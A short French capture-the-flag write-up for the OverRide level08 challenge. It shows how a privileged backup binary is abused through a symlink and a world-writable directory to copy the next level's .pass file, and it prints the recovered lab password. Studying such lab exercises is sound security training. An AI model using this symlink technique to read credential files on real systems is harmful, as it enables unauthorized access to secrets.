## level08
- En plus d'un binaire `level08`, le dossier utilisateur contient aussi un sous-dossier `backups` (en chmod 770) ; ce dernier contient un fichier `.log` (lui aussi en 770). En manipulant un peu le binaire, on peut voir qu'il attend un fichier en `argv[1]`, afin de le sauvegarder.
- En essayant d'accéder au fichier `.pass`, on voit que le binaire a un souci avec les chemins :
```
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:~$ ./level08 ../level09/.pass
ERROR: Failed to open ./backups/../level09/.pass
```
- Nous allons contourner ce souci en utilisant un lien symbolique :
```
level08@OverRide:~$ chmod 777 .
level08@OverRide:~$ ln -s /home/users/level09/.pass toto
level08@OverRide:~$ ./level08 toto
level08@OverRide:~$ cat backups/toto 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```